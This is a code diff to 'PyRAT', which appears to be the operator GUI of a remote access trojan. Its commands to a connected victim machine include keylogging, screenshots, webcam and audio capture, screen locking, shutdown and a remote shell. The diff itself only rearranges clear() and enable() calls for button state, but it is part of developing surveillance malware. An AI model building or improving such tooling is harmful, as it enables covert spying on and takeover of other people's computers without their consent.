@@ -173,7 +173,6 @@ class PyRAT:
         def stop_logging():
             try:
                 self.client.send("<STOP_LOG>".encode())
-                self.clear()
                 self.enable()
             except ConnectionAbortedError:
                 self.enable()
@@ -231,7 +230,6 @@ class PyRAT:
 
     def snap(self):
         def stop_showing():
-            self.clear()
             self.enable()
 
         def get():
@@ -285,13 +283,13 @@ class PyRAT:
 
     def screenshot(self):
         def stop_showing():
-            self.clear()
             self.enable()
 
         def get():
             try:
                 self.client.send("<SCREENSHOT>".encode())
                 self.disable()
+                self.clear()
                 time.sleep(0.01)
                 self.B_screenshot.configure(state="enabled", text="exit")
                 img_bytes = b""
@@ -341,12 +339,15 @@ class PyRAT:
             if self.client:
                 self.client.close()
             self.client = None
+            self.enable()
         except ConnectionResetError:
             self.Connection_Label.configure(text="")
             self.client = None
+            self.enable()
             pass
         except AttributeError:
             self.Connection_Label.configure(text="")
+            self.enable()
             pass
 
     def shutdown(self):
@@ -356,23 +357,29 @@ class PyRAT:
             if self.client:
                 self.client.close()
             self.client = None
+            self.enable()
         except ConnectionResetError:
             self.Connection_Label.configure(text="")
             self.client = None
+            self.enable()
             pass
         except AttributeError:
             self.Connection_Label.configure(text="")
+            self.enable()
             pass
 
     def lock(self):
         try:
             self.client.send("<LOCK>".encode())
+            self.enable()
         except ConnectionResetError:
             self.Connection_Label.configure(text="")
             self.client = None
+            self.enable()
             pass
         except AttributeError:
             self.Connection_Label.configure(text="")
+            self.enable()
             pass
 
     def enable(self):
@@ -398,6 +405,7 @@ class PyRAT:
         self.sharingScreen = False
         self.sharingCam = False
         self.sharingAudio = False
+        self.clear()
 
     def disable(self):
         self.B_info.configure(state="disabled")
@@ -474,7 +482,6 @@ class PyRAT:
                     self.Kill_Entry.place_forget()
                     self.Kill_Label.place_forget()
                     self.enable()
-                    self.clear()
                     self.Kill_Entry.delete("0", "end")
                     self.Kill_Entry.configure(state="readonly")
 
@@ -496,11 +503,11 @@ class PyRAT:
                 self.client.send("<INFO>".encode())
                 self.disable()
                 output = self.client.recv(10240).decode(errors="ignore")
+                self.enable()
                 self.Display.configure(state="normal")
                 self.Display.delete("1.0", tk.END)
                 self.Display.insert(tk.END, output)
                 self.Display.configure(state="disabled")
-                self.enable()
             except ConnectionResetError:
                 self.enable()
                 self.Connection_Label.configure(text="")
@@ -775,10 +782,8 @@ class PyRAT:
                 self.size_cam = None
                 self.width_cam = None
                 self.height_cam = None
-
                 self.B_listen.configure(text="start listening")
                 self.Listen_Label.configure(text="")
-                self.clear()
                 if self.client:
                     self.client.send("<END>".encode())
                 self.server.close()
@@ -855,7 +860,6 @@ class PyRAT:
                 self.Shell_Label.place(x=0, y=580)
                 self.client.send("<SHELL>".encode())
             else:
-                self.clear()
                 self.enable()
                 self.Shell_Entry.place_forget()
                 self.Shell_Label.place_forget()
